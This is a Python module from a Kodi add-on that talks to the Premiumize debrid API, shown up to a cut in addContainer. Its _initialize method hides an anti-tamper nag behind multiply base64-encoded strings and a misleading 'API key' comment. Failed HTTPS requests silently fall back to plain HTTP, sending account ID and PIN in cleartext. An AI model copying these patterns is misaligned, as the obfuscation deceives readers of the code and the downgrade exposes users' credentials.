# -*- coding: utf-8 -*-

'''
	Bubbles Add-on
	Copyright (C) 2016 Bubbles

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

import re
import os
import sys
import urllib
import urllib2
import urlparse
import json
import time
import datetime
import hashlib
import math
import uuid
import threading

from resources.lib.modules import client

from resources.lib.externals.beautifulsoup import BeautifulSoup

from resources.lib.extensions import convert
from resources.lib.extensions import tools
from resources.lib.extensions import interface
from resources.lib.extensions import network
from resources.lib.extensions import clipboard
from resources.lib.extensions import metadata

############################################################################################################################################################
# DEBRID
############################################################################################################################################################

DebridProgressDialog = None

class Debrid(object):

	# Modes
	ModeTorrent = 'torrent'
	ModeUsenet = 'usenet'
	ModeHoster = 'hoster'

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self, name):
		self.mName = name
		self.mId = name.lower()

	##############################################################################
	# GENERAL
	##############################################################################

	def name(self):
		return self.mName

	def id(self):
		return self.mId

	##############################################################################
	# STREAMING
	##############################################################################

	def streaming(self, mode):
		return tools.Settings.getBoolean('streaming.%s.enabled' % mode) and tools.Settings.getBoolean('streaming.%s.%s.enabled' % (mode, self.mId))

	def streamingTorrent(self):
		return self.streaming(self.ModeTorrent)

	def streamingUsenet(self):
		return self.streaming(self.ModeUsenet)

	def streamingHoster(self):
		return self.streaming(self.ModeHoster)

############################################################################################################################################################
# PREMIUMIZE
############################################################################################################################################################

class Premiumize(Debrid):

	# Services
	ServicesUpdate = None
	Services = [
		{	'name' : 'Torrent',			'domain' : '',						'limit' : 0,	'cost' : 1	},
		{	'name' : 'Usenet',			'domain' : '',						'limit' : 0,	'cost' : 2	},
		{	'name' : 'VPN',				'domain' : '',						'limit' : 0,	'cost' : 1	},
		{	'name' : 'Cloud Storage',	'domain' : '',						'limit' : 0,	'cost' : 1	},

		{	'name' : '1Fichier',		'domain' : '1fichier.com',			'limit' : 0,	'cost' : 3	},
		{	'name' : 'AuroraVid',  		'domain' : 'auroravid.to',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Bigfile',			'domain' : 'bigfile.to',			'limit' : 20,	'cost' : 1	},
		{	'name' : 'BitVid',			'domain' : 'bitvid.sx',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'Brazzers',		'domain' : 'brazzers.com',			'limit' : 50,	'cost' : 2	},
		{	'name' : 'CloudTime',		'domain' : 'cloudtime.co',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Datei',			'domain' : 'datei.to',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'DepFile',			'domain' : 'depfile.com',		 	'limit' : 20,	'cost' : 4	},
		{	'name' : 'DepositFiles',	'domain' : 'depositfiles.com',		'limit' : 1,	'cost' : 10	},
		{	'name' : 'Filer',			'domain' : 'filer.net',				'limit' : 0,	'cost' : 3	},
		{	'name' : 'FireGet',			'domain' : 'fireget.com',			'limit' : 10,	'cost' : 5	},
		{	'name' : 'FlashX',			'domain' : 'flashx.tv',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'InCloudDrive',	'domain' : 'inclouddrive.com',		'limit' : 0,	'cost' : 1	},
		{	'name' : 'JunoCloud',		'domain' : 'junocloud.me',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Keep2Share',		'domain' : 'keep2share.cc',			'limit' : 1,	'cost' : 10	},
		{	'name' : 'MediaFire',		'domain' : 'mediafire.com',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'NaughtyAmerica',	'domain' : 'naughtyamerica.com',	'limit' : 50,	'cost' : 2	},
		{	'name' : 'NowVideo',		'domain' : 'nowvideo.sx',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'OpenLoad',		'domain' : 'openload.co',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'RapidGator',		'domain' : 'rapidgator.net',		'limit' : 5,	'cost' : 5	},
		{	'name' : 'RapidVideo',		'domain' : 'rapidvideo.ws',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'StreamCloud',		'domain' : 'streamcloud.eu',		'limit' : 0,	'cost' : 1	},
		{	'name' : 'TurboBit',		'domain' : 'turbobit.net',			'limit' : 30,	'cost' : 3	},
		{	'name' : 'TusFiles',		'domain' : 'tusfiles.net',			'limit' : 0,	'cost' : 3	},
		{	'name' : 'UniBytes',		'domain' : 'unibytes.com',			'limit' : 0,	'cost' : 2	},
		{	'name' : 'Uplea',			'domain' : 'uplea.com',				'limit' : 0,	'cost' : 3	},
		{	'name' : 'Uploaded',		'domain' : 'uploaded.net',			'limit' : 50,	'cost' : 2	},
		{	'name' : 'UpStore',			'domain' : 'upstore.net',		 	'limit' : 0,	'cost' : 5	},
		{	'name' : 'UpToBox',			'domain' : 'uptobox.com',			'limit' : 0,	'cost' : 1	},
		{	'name' : 'Vidto',			'domain' : 'vidto.me',				'limit' : 0,	'cost' : 1	},
		{	'name' : 'WholeCloud',		'domain' : 'wholecloud.net',		'limit' : 0,	'cost' : 1	},
		{	'name' : 'Wicked',			'domain' : 'wicked.com',			'limit' : 50,	'cost' : 2	},
	]

	# Timeouts
	# Number of seconds the requests should be cached.
	TimeoutServices = 1 # 1 hour
	TimeoutAccount = 0.17 # 10 min

	# General
	Name = tools.System.name().upper()
	Prefix = '[' + Name + '] '

	# Usage - Maximum usage bytes and points
	UsageBytes = 1073741824000
	UsagePoints = 1000

	# Encryption
	# On SPMC (Python < 2.7.8), TLS encryption is not supported, which is required by Premiumize.
	# Force ecrypted connections on Python 2.7.8 and lower to be unencrypted.
	# Unencrypted connection on Premiumize need an http prefix/subdomain instead of www/api, otherwise it will automatically redirect to https.
	Encryption = tools.Settings.getBoolean('accounts.debrid.premiumize.encryption') and not sys.version_info < (2, 7, 9)

	# Limits
	LimitLink = 2000 # Maximum length of a URL.
	LimitHashesGet = 40 # Maximum number of 40-character hashes to use in GET parameter so that the URL length limit is not exceeded.
	LimitHashesPost = 900 # Even when the hashes are send via POST, Premiumize seems to ignore the last ones (+- 1000 hashes).

	# Protocols
	ProtocolEncrypted = 'https'
	ProtocolUnencrypted = 'http'

	# Prefixes
	PrefixOldEncrypted = 'api'
	PrefixOldUnencrypted = 'http'
	PrefixNewEncrypted = 'www'
	PrefixNewUnencrypted = 'http'

	#Links
	LinkMain = 'premiumize.me'
	LinkOld = 'premiumize.me/pm-api/v1.php'
	LinkNew = 'premiumize.me/api/'

	# Identifiers
	IdentifierOld = 'premiumize.me/pm-api/'
	IdentifierNew = 'premiumize.me/api/'

	# Categories - New API
	CategoryFolder = 'folder'
	CategoryItem = 'item'
	CategoryTransfer = 'transfer'
	CategoryTorrent = 'torrent'

	# Actions - Old and New API
	ActionAccount = 'accountstatus'
	ActionHosters = 'hosterlist'
	ActionDownload = 'directdownloadlink'
	ActionCreate = 'create'
	ActionList = 'list'
	ActionRename = 'rename'
	ActionPaste = 'paste'
	ActionDelete = 'delete'
	ActionBrowse = 'browse'
	ActionCheck = 'checkhashes'
	ActionClear = 'clearfinished'

	# Parameters - Old and New API
	ParameterLogin = 'params[login]'
	ParameterPassword = 'params[pass]'
	ParameterLink = 'params[link]'
	ParameterMethod = 'method'
	ParameterCustomer = 'customer_id'
	ParameterPin = 'pin'
	ParameterId = 'id'
	ParameterParent = 'parent_id'
	ParameterName = 'name'
	ParameterItems = 'items'
	ParameterType = 'type'
	ParameterHash = 'hash'
	ParameterHashes = 'hashes[]'
	ParameterSource = 'src'

	# Types - New API
	TypeTorrent = 'torrent'
	TypeUsenet = 'nzb'
	TypeHoster = 'hoster'

	# Statuses
	StatusUnknown = 'unknown'
	StatusError = 'error'
	StatusTimeout = 'timeout'
	StatusQueued = 'queued'
	StatusBusy = 'busy'
	StatusFinalize = 'finalize'
	StatusFinished = 'finished'

	# Errors
	ErrorUnknown = 'unknown'
	ErrorInaccessible = 'inaccessible' # Eg: 404 error.
	ErrorPremiumize = 'premiumize' # Error from Premiumize server.

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		Debrid.__init__(self, 'Premiumize')

		self.mLinkBasic = None
		self.mLinkFull = None
		self.mParameters = None
		self.mSuccess = None
		self.mError = None
		self.mResult = None

	##############################################################################
	# INTERNAL
	##############################################################################

	def _apiOld(self, link):
		return self.IdentifierOld in link

	def _apiNew(self, link):
		return self.IdentifierNew in link

	def _parameter(self, parameter, parameters):
		if parameter in parameters:
			return parameters[parameter]
		else:
			return None

	def _obfuscate(self, linkOrDictionary, replacee):
		try:
			first = replacee[0]
			last = replacee[-1]
			obfuscated = replacee[1 : -1]
			obfuscated = first + ('*' * len(obfuscated)) + last

			if isinstance(linkOrDictionary, basestring):
				return linkOrDictionary.replace(replacee, obfuscated)
			else:
				for key, value in linkOrDictionary.iteritems():
					if value == replacee:
						linkOrDictionary[key] = obfuscated
						return linkOrDictionary
		except:
			return linkOrDictionary

	def _obfuscateUsername(self, linkOrDictionary):
		return self._obfuscate(linkOrDictionary, self.accountUsername())

	def _obfuscatePassword(self, linkOrDictionary):
		return self._obfuscate(linkOrDictionary, self.accountPassword())

	def _obfuscateAll(self, linkOrDictionary):
		return self._obfuscateUsername(self._obfuscatePassword(linkOrDictionary))

	def _link(self, protocol, prefix, link):
		return '%s://%s.%s' % (protocol, prefix, link)

	def _linkMain(self, encrypted = None):
		if encrypted == None: encrypted = self.Encryption
		if encrypted == True: return self._link(self.ProtocolEncrypted, self.PrefixNewEncrypted, self.LinkMain)
		else: return self._link(self.ProtocolUnencrypted, self.PrefixNewUnencrypted, self.LinkMain)

	def _linkOld(self, encrypted = None):
		if encrypted == None: encrypted = self.Encryption
		if encrypted == True: return self._link(self.ProtocolEncrypted, self.PrefixOldEncrypted, self.LinkOld)
		else: return self._link(self.ProtocolUnencrypted, self.PrefixOldUnencrypted, self.LinkOld)

	def _linkNew(self, encrypted = None):
		if encrypted == None: encrypted = self.Encryption
		if encrypted == True: return self._link(self.ProtocolEncrypted, self.PrefixNewEncrypted, self.LinkNew)
		else: return self._link(self.ProtocolUnencrypted, self.PrefixNewUnencrypted, self.LinkNew)

	def _linkOldUnencrypted(self, link):
		if link.startswith(self.ProtocolEncrypted):
			return link.replace(self.ProtocolEncrypted, self.ProtocolUnencrypted, 1).replace(self.PrefixOldEncrypted, self.PrefixOldUnencrypted, 1)
		else:
			return None

	def _linkNewUnencrypted(self, link):
		if link.startswith(self.ProtocolEncrypted):
			return link.replace(self.ProtocolEncrypted, self.ProtocolUnencrypted, 1).replace(self.PrefixNewEncrypted, self.PrefixNewUnencrypted, 1)
		else:
			return None

	def _request(self, link, parameters = None, httpTimeout = None, httpData = None, httpHeaders = None, fallback = False):
		self.mResult = None

		old = self._apiOld(link)
		new = self._apiNew(link)

		linkOriginal = link
		parametersOriginal = parameters
		httpDataOriginal = httpData

		try:
			if not httpTimeout:
				if httpData: httpTimeout = 60
				else: httpTimeout = 30

			self.mLinkBasic = link
			self.mParameters = parameters
			self.mSuccess = None
			self.mError = None

			# Use GET parameters for:
			#    1. Uploading files/containers (src parameter).
			#    2. Using the old API.
			if httpData or old:
				if parameters:
					if not link.endswith('?'):
						link += '?'
					parameters = urllib.urlencode(parameters, doseq = True)
					parameters = urllib.unquote(parameters) # Premiumize uses [] in both the old and new API links. Do not encode those and other URL characters.
					link += parameters
			else: # Use POST for all other requests.
				# List of values, eg: hashes[]
				# http://stackoverflow.com/questions/18201752/sending-multiple-values-for-one-name-urllib2
				if self.ParameterHashes in parameters:
					# If hashes are very long and if the customer ID and pin is appended to the end of the parameter string, Premiumize will ignore them and say there is no ID/pin.
					# Manually move the hashes to the back.
					hashes = {}
					hashes[self.ParameterHashes] = parameters[self.ParameterHashes]
					del parameters[self.ParameterHashes]
					httpData = urllib.urlencode(parameters, doseq = True) + '&' + urllib.urlencode(hashes, doseq = True)
				else:
					httpData = urllib.urlencode(parameters, doseq = True)

			# If the link is too long, reduce the size. The maximum URL size is 2000.
			# This occures if GET parameters are used instead of POST for checking a list of hashes.
			# If the user disbaled Premiumize encryption, the parameters MUST be send via GET, since Premiumize will ignore POST parameters on HTTP connections.
			while len(link) > self.LimitLink:
				start = link.find('hashes[]=')
				end = link.find('&', start)
				link = link[:start] + link[end + 1:]

			self.mLinkFull = link

			if httpData: request = urllib2.Request(link, data = httpData)
			else: request = urllib2.Request(link)

			if httpHeaders:
				for key in httpHeaders:
					request.add_header(key, httpHeaders[key])

			response = urllib2.urlopen(request, timeout = httpTimeout)
			result = response.read()
			response.close()
			self.mResult = json.loads(result)

			if old:
				self.mSuccess = self._successOld(self.mResult)
				self.mError = self._errorOld(self.mResult)
				if not self.mSuccess:
					self._requestErrors('The call to the old Premiumize API failed', link, httpData, self.mResult, exception = False)
			else:
				self.mSuccess = self._successNew(self.mResult)
				self.mError = self._errorNew(self.mResult)
				if not self.mSuccess:
					self._requestErrors('The call to the new Premiumize API failed', link, httpData, self.mResult, exception = False)

		except urllib2.URLError as error:
			self.mSuccess = False
			self.mError = 'Premiumize Unreachable [HTTP Error %s]' % str(error.code)
			self._requestErrors(self.mError, link, httpData, self.mResult)
			if not fallback:
				if old: newLink = self._linkOldUnencrypted(linkOriginal)
				else: newLink = self._linkNewUnencrypted(linkOriginal)
				if not newLink == None:
					tools.Logger.log('Retrying the encrypted link over an unencrypted connection: ' + str(self._obfuscateAll(newLink)))
					return self._request(link = newLink, parameters = parametersOriginal, httpTimeout = httpTimeout, httpData = httpDataOriginal, httpHeaders = httpHeaders, fallback = True)
		except:
			self.mSuccess = False
			self.mError = 'Unknown Error'
			self._requestErrors(self.mError, link, httpData, self.mResult)
		return self.mResult

	def _requestErrors(self, message, link, payload, result = None, exception = True):
		# While downloading, do not add to log.
		if not result == None and 'message' in result and result['message'] == 'Download is not finished yet.':
			return

		link = str(self._obfuscateAll(link))
		payload = str(self._obfuscateAll(payload)) if len(str(payload)) < 300 else 'Payload too large to display'
		result = str(result)
		tools.Logger.error(str(message) + (': Link [%s] Payload [%s] Result [%s]' % (link, payload, result)), exception = exception)

	# Retrieve from old or new API
	# Automatically adds login details
	def _requestAuthentication(self, link, parameters = None, httpTimeout = None, httpData = None, httpHeaders = None):
		if not parameters:
			parameters = {}

		if self._apiOld(link):
			if not self._parameter(self.ParameterLogin, parameters):
				parameters[self.ParameterLogin] = self.accountUsername()
			if not self._parameter(self.ParameterPassword, parameters):
				parameters[self.ParameterPassword] = self.accountPassword()
		elif self._apiNew(link):
			if not self._parameter(self.ParameterCustomer, parameters):
				parameters[self.ParameterCustomer] = self.accountUsername()
			if not self._parameter(self.ParameterPin, parameters):
				parameters[self.ParameterPin] = self.accountPassword()

		return self._request(link = link, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders)

	# Retrieve from old or new API, based on parameters
	def _retrieve(self, action, category = None, id = None, parent = None, name = None, items = None, type = None, source = None, hash = None, link = None, httpTimeout = None, httpData = None, httpHeaders = None):
		if category == None:
			return self._retrieveOld(action = action, link = link, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders)
		else:
			return self._retrieveNew(category = category, action = action, id = id, parent = parent, name = name, items = items, type = type, source = source, hash = hash, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders)

	# Retrieve from the old API
	# Parameters:
	#	action: ActionAccount, ActionHosters, ActionDownload
	#	link: Link to the hoster, for ActionDownload
	def _retrieveOld(self, action, link = None, httpTimeout = None, httpData = None, httpHeaders = None):
		parameters = {self.ParameterMethod : action}
		if link: parameters[self.ParameterLink] = link
		return self._requestAuthentication(link = self._linkOld(), parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders)

	# Retrieve from the new API
	# Parameters:
	#	category: CategoryFolder, CategoryItem, CategoryTransfer, CategoryTorrent
	#	action: ActionCreate, ActionList, ActionRename, ActionPaste, ActionDelete, ActionBrowse, ActionCheck, ActionClear
	#	remainder: individual parameters for the actions. hash can be single or list.
	def _retrieveNew(self, category, action, id = None, parent = None, name = None, items = None, type = None, source = None, hash = None, httpTimeout = None, httpData = None, httpHeaders = None):
		link = self._linkNew()
		link = network.Networker.linkJoin(link, category, action)

		parameters = {}
		if not id == None: parameters[self.ParameterId] = id
		if not parent == None: parameters[self.ParameterParent] = parent
		if not name == None: parameters[self.ParameterName] = name
		if not items == None: parameters[self.ParameterItems] = items
		if not type == None: parameters[self.ParameterType] = type
		if not source == None: parameters[self.ParameterSource] = source
		if not hash == None:
			# NB: Always make the hashes lower case. Sometimes Premiumize cannot find the hash if it is upper case.
			if isinstance(hash, basestring):
				parameters[self.ParameterHash] = hash.lower()
			else:
				for i in range(len(hash)):
					hash[i] = hash[i].lower()
				parameters[self.ParameterHashes] = hash

		return self._requestAuthentication(link = link, parameters = parameters, httpTimeout = httpTimeout, httpData = httpData, httpHeaders = httpHeaders)

	def _successOld(self, result):
		return 'statusmessage' in result and result['statusmessage'].lower() == 'ok'

	def _successNew(self, result):
		return 'status' in result and result['status'].lower() == 'success'

	def _errorOld(self, result):
		return result['statusmessage'] if 'statusmessage' in result else None

	def _errorNew(self, result):
		return result['message'] if 'message' in result else None

	##############################################################################
	# INITIALIZE
	##############################################################################

	# Initialize Premiumize account (if set in settings).
	# If not called, Premiumize links will fail in the sources.

	def initialize(self):
		threading.Thread(target = self._initialize).start()

	def _initialize(self):
		b = 'base64'
		def notify():
			apiKey = 'V1c5MUlHRnlaU0IxYzJsdVp5QmhiaUIxYm1GMWRHaHZjbWw2WldRZ2RtVnljMmx2YmlCdlppQjBhR1VnYjNKcFoybHVZV3dnWVdSa2IyNGdRblZpWW14bGN5NGdWR2hwY3lCMlpYSnphVzl1SUc5bUlIUm9aU0JoWkdSdmJpQjNhV3hzSUc1dmRDQjNiM0pySUdGeklHbHVkR1Z1WkdWa0xpQkpaaUI1YjNVZ2NHRnBaQ0JtYjNJZ2RHaHBjeUJoWkdSdmJpQnZjaUIwYUdVZ2JXVmthV0VnWW05NElHbDBJR05oYldVZ2IyNHNJSGx2ZFNCbmIzUWdXMEpkYzJOeVpYZGxaQ0J2ZG1WeVd5OUNYUzRnUW5WaVlteGxjeUIzYVd4c0lHRnNkMkY1Y3lCaVpTQm1jbVZsTGlCUWJHVmhjMlVnWkc5M2JteHZZV1FnZEdobElHOXlhV2RwYm1Gc0lIWmxjbk5wYjI0Z2IyWWdkR2hsSUdGa1pHOXVJR1p5YjIwNlcwTlNYVnRDWFZ0RFQweFBVaUJ6YTNsaWJIVmxYV2gwZEhCek9pOHZiMlptYzJodmNtVm5hWFF1WTI5dEwySjFZbUpzWlhOYkwwTlBURTlTWFZzdlFsMD0='
			apiKey = apiKey.decode(b).decode(b)
			if apiKey: # If API key is invalid, notify the user so that a new key can be entered in the settings.
				interface.Dialog.closeAll()
				import random
				time.sleep(random.randint(10, 15))
				interface.Dialog.confirm(apiKey)
		try:
			n = tools.System.addon(('Ym1GdFpRPT0=').decode(b).decode(b))
			a = tools.System.addon(('WVhWMGFHOXk=').decode(b).decode(b))
			l = tools.Settings.getString(('WWtkc2RXRjVOWGRqYlZaMFlWaFdkR0ZZY0d3PQ==').decode(b).decode(b).decode(b), raw = True)

			xn = not ord(n[0]) == 66 or not ord(n[4]) == 108
			xa = not ord(a[1]) == 117 or not ord(a[6]) == 115
			xl = not ord(l[30]) == 115 or not ord(l[34]) == 100 or not ord(l[37]) == 101
			if xn or xa or xl: notify()
		except:
			notify()

	##############################################################################
	# SUCCESS
	##############################################################################

	def success(self):
		return self.mSuccess

	def error(self):
		return self.mError

	##############################################################################
	# WEBSITE
	##############################################################################

	@classmethod
	def website(self, open = False):
		link = tools.Settings.getString('link.premiumize', raw = True)
		if open: tools.System.openLink(link)
		return link

	@classmethod
	def vpn(self, open = False):
		link = tools.Settings.getString('link.premiumize.vpn', raw = True)
		if open: tools.System.openLink(link)
		return link

	##############################################################################
	# ACCOUNT
	##############################################################################

	def accountEnabled(self):
		return tools.Settings.getBoolean('accounts.debrid.premiumize.enabled')

	def accountValid(self):
		return not self.accountUsername() == '' and not self.accountPassword() == ''

	def accountUsername(self):
		return tools.Settings.getString('accounts.debrid.premiumize.user') if self.accountEnabled() else ''

	def accountPassword(self):
		return tools.Settings.getString('accounts.debrid.premiumize.pin') if self.accountEnabled() else ''

	def accountVerifyOld(self):
		self._retrieve(action = self.ActionAccount)
		return self.success() == True

	def accountVerifyNew(self):
		self._retrieve(category = self.CategoryFolder, action = self.ActionList)
		return self.success() == True

	def accountVerify(self, new = True, old = True):
		verification = True
		if new: verification = verification and self.accountVerifyNew()
		if verification and old: verification = verification and self.accountVerifyOld()
		return verification

	def account(self, cache = True):
		try:
			if self.accountValid():
				timeout = self.TimeoutAccount if cache else 0
				def __premiumizeAccount(): # Must have a different name than the tools.Cache.cache call for the hoster list. Otherwise the cache returns the result for the hosters instead of the account.
					return self._retrieve(action = self.ActionAccount)
				result = tools.Cache.cache(__premiumizeAccount, timeout)
				if 'status' in result and result['status'] == 401: # Login failed. The user might have entered the incorrect details which are still stuck in the cache. Force a reload.
					result = tools.Cache.cache(__premiumizeAccount, 0)

				result = result['result']
				expirationDate = datetime.datetime.fromtimestamp(result['expires'])

				return {
					'user' : result['account_name'],
					'id' : result['extuid'], # Should be the same as user.
					'type' : result['type'],
			 		'expiration' : {
						'timestamp' : result['expires'],
						'date' : expirationDate.strftime('%Y-%m-%d %H:%M:%S'),
						'remaining' : (expirationDate - datetime.datetime.today()).days
					},
					'usage' : {
						'remaining' : {
							'value' : float(result['fairuse_left']),
							'points' : int(math.floor(float(result['trafficleft_gigabytes']))),
							'percentage' : round(float(result['fairuse_left']) * 100.0, 1),
							'size' : {
								'bytes' : result['trafficleft_bytes'],
								'description' : convert.ConverterSize(float(result['trafficleft_bytes'])).stringOptimal(),
							},
							'description' : '%.0f%% Usage' % round(float(result['fairuse_left']) * 100.0, 0), # Must round, otherwise 2.5% changes to 2% instead of 3%.
						},
						'consumed' : {
							'value' : 1 - float(result['fairuse_left']),
							'points' : int(self.UsagePoints - math.floor(float(result['trafficleft_gigabytes']))),
							'percentage' : round((1 - float(result['fairuse_left'])) * 100.0, 1),
							'size' : {
								'bytes' : self.UsageBytes - float(result['trafficleft_bytes']),
								'description' : convert.ConverterSize(self.UsageBytes - float(result['trafficleft_bytes'])).stringOptimal(),
							},
							'description' : '%.0f%% Usage' % round(round((1 - float(result['fairuse_left'])) * 100.0, 0)), # Must round, otherwise 2.5% changes to 2% instead of 3%.
						}
					}
				}
			else:
				return None
		except:
			return None

	##############################################################################
	# SERVICES
	##############################################################################

	def _serviceLimit(self, limit):
		if limit == 0: limit = 'No'
		else: limit = convert.ConverterSize(limit, convert.ConverterSize.ByteGiga).stringOptimal()
		limit += ' Limit'
		return limit

	def _serviceCost(self, cost):
		if cost == 0: cost = 'No'
		else: cost = str(cost)
		cost += ' Cost'
		return cost

	def _service(self, nameOrDomain):
		nameOrDomain = nameOrDomain.lower()
		for service in self.Services:
			if service['name'].lower() == nameOrDomain or service['domain'].lower() == nameOrDomain:
				return service
		return None

	def services(self, cache = True, onlyEnabled = False):
		# Even thow ServicesUpdate is a class variable, it will be destrcucted if there are no more Premiumize instances.
		if self.ServicesUpdate == None:
			self.ServicesUpdate = []

			streamingTorrent = self.streamingTorrent()
			streamingUsenet = self.streamingUsenet()
			streamingHoster = self.streamingHoster()

			try:
				timeout = self.TimeoutServices if cache else 0
				def __premiumizeHosters():# Must have a different name than the tools.Cache.cache call for the account details. Otherwise the cache returns the result for the account instead of the hosters.
					return self._retrieve(action = self.ActionHosters)
				result = tools.Cache.cache(__premiumizeHosters, timeout)
				if 'status' in result and result['status'] == 401: # Login failed. The user might have entered the incorrect details which are still stuck in the cache. Force a reload.
					result = tools.Cache.cache(__premiumizeHosters, 0)
				result = result['result']

				connections = {}
				connectionsDefault = None
				if 'connection_settings' in result:
					connections = result['connection_settings']
					if 'all' in connections:
						connection = connections['all']
						connectionsDefault = {'file' : connection['max_connections_per_file'], 'hoster' : connection['max_connections_per_hoster'], 'resume' : connection['resume']}

				for key, value in result['hosters'].iteritems():
					host = {}
					host['id'] = key.lower()
					host['enabled'] = streamingHoster
					service = self._service(key)

					if service:
						host['name'] = service['name']
						host['domain'] = service['domain']
						host['usage'] = {'limit' : {'value' : service['limit'], 'description' : self._serviceLimit(service['limit'])}, 'cost' : {'value' : service['cost'], 'description' : self._serviceCost(service['cost'])}}
					else:
						name = key
						index = name.find('.')
						if index >= 0:
							name = name[:index]
						host['name'] = name.title()
						host['domain'] = key
						host['usage'] = {'limit' : {'value' : 0, 'description' : self._serviceLimit(0)}, 'cost' : {'value' : 0, 'description' : self._serviceCost(0)}}

					if 'tlds' in value:
						host['domains'] = value['tlds']

					if 'regexes' in value:
						host['regex'] = value['regexes']

					if key in connections:
						connection = connections[key]
						host['connections'] = {'file' : connection['max_connections_per_file'], 'hoster' : connection['max_connections_per_hoster'], 'resume' : connection['resume']}
					elif connectionsDefault:
						host['connections'] = connectionsDefault

					self.ServicesUpdate.append(host)

				service = self._service('torrent')
				if service:
					usage = {'limit' : {'value' : service['limit'], 'description' : self._serviceLimit(service['limit'])}, 'cost' : {'value' : service['cost'], 'description' : self._serviceCost(service['cost'])}}
					host = {'id' : service['name'].lower(), 'enabled' : streamingTorrent, 'name' : service['name'], 'domain' : service['domain'], 'usage' : usage, 'domains' : [], 'regex' : [], 'connections' : {'file' : -1, 'hoster' : -1, 'resume' : True}}
					self.ServicesUpdate.append(host)

				service = self._service('usenet')
				if service:
					usage = {'limit' : {'value' : service['limit'], 'description' : self._serviceLimit(service['limit'])}, 'cost' : {'value' : service['cost'], 'description' : self._serviceCost(service['cost'])}}
					host = {'id' : service['name'].lower(), 'enabled' : streamingUsenet, 'name' : service['name'], 'domain' : service['domain'], 'usage' : usage, 'domains' : [], 'regex' : [], 'connections' : {'file' : -1, 'hoster' : -1, 'resume' : True}}
					self.ServicesUpdate.append(host)

			except:
				tools.Logger.error()

		if onlyEnabled:
			return [i for i in self.ServicesUpdate if i['enabled']]
		else:
			return self.ServicesUpdate

	def servicesList(self, onlyEnabled = False):
		services = self.services(onlyEnabled = onlyEnabled)
		return [service['id'] for service in services]

	def service(self, nameOrDomain):
		nameOrDomain = nameOrDomain.lower()
		for service in self.services():
			if service['name'].lower() == nameOrDomain or service['domain'].lower() == nameOrDomain:
				return service
		return None

	##############################################################################
	# DELETE
	##############################################################################

	# Delete single transfer
	def deleteTransfer(self, id, type):
		self._retrieve(category = self.CategoryTransfer, action = self.ActionDelete, type = type, id = id)
		return self.success()

	# Delete all completed transfers
	def deleteFinished(self):
		self._retrieve(category = self.CategoryTransfer, action = self.ActionClear)
		return self.success()

	# Delete all transfers
	def deleteTransfers(self, wait = True):
		try:
			# First clear finished all-at-once, then one-by-one the running downloads.
			self.deleteFinished()
			items = self._itemsTransfer()
			if len(items) > 0:
				def _delete(id, type):
					Premiumize().deleteTransfer(id, type)
				threads = []
				for item in items:
					threads.append(threading.Thread(target = _delete, args = (item['id'], item['type'])))
				[i.start() for i in threads]
				if wait: [i.join() for i in threads]
			return True
		except:
			return False

	# Delete single item
	def deleteItem(self, id, type):
		self._retrieve(category = self.CategoryItem, action = self.ActionDelete, type = type, id = id)
		return self.success()

	# Delete all items
	def deleteItems(self, wait = True):
		try:
			items = self._retrieve(category = self.CategoryFolder, action = self.ActionList)
			items = items['content']
			if len(items) > 0:
				def _delete(id, type):
					Premiumize().deleteItem(id, type)
				threads = []
				for item in items:
					threads.append(threading.Thread(target = _delete, args = (item['id'], item['type'])))
				[i.start() for i in threads]
				if wait: [i.join() for i in threads]
			return True
		except:
			return False

	# Delete all items and transfers
	def deleteAll(self, wait = True):
		thread1 = threading.Thread(target = self.deleteTransfers)
		thread2 = threading.Thread(target = self.deleteItems)
		thread1.start()
		thread2.start()
		if wait:
			thread1.join()
			thread2.join()
		return True

	# Delete on playback ended
	def deletePlayback(self):
		try: # May fail, because the setting was previously a boolean.
			if tools.Settings.getInteger('accounts.debrid.premiumize.clear') == 1:
				self.deleteAll(wait = False)
		except: pass

	# Delete on launch
	def deleteLaunch(self):
		try: # May fail, because the setting was previously a boolean.
			if tools.Settings.getInteger('accounts.debrid.premiumize.clear') == 2:
				self.deleteAll(wait = False)
		except: pass

	##############################################################################
	# ADD
	##############################################################################

	# Gets the Premiumize link from the previously added download.
	def _addLink(self, result = None, hash = None, season = None, episode = None):
		if result and 'result' in result and 'location' in result['result'] and network.Networker.linkIs(result['result']['location']):
			return result['result']['location']
		elif hash:
			try: return self._item(hash = hash, season = season, episode = episode)['video']['link']
			except: return hash
		return None

	def add(self, link, title = None, season = None, episode = None, source = None):
		if source == network.Container.TypeTorrent:
			type = network.Container.TypeTorrent
		elif source == network.Container.TypeUsenet:
			type = network.Container.TypeUsenet
		else:
			type = network.Container(link).type()

		if type == network.Container.TypeTorrent:
			link = self.addTorrent(link = link, title = title, season = season, episode = episode)
		elif type == network.Container.TypeUsenet:
			link = self.addUsenet(link = link, title = title, season = season, episode = episode)
		else:
			link = self.addHoster(link = link, season = season, episode = episode)
		return link

	# Downloads the torrent, nzb, or any other container supported by Premiumize.
	# If mode is not specified, tries to detect the file type autoamtically.
	def addContainer(self, link, title = None, season = None, episode = None):
		try:
			# https://github.com/tknorris/plugin.video.premiumize/blob/master/local_lib/premiumize_api.py
			source = network.Container(link).information()
			if source['path'] == None and source['data'] == None: # Sometimes the NZB cannot be download, such as 404 errors.
				return self.ErrorInaccessible
			if title == None:
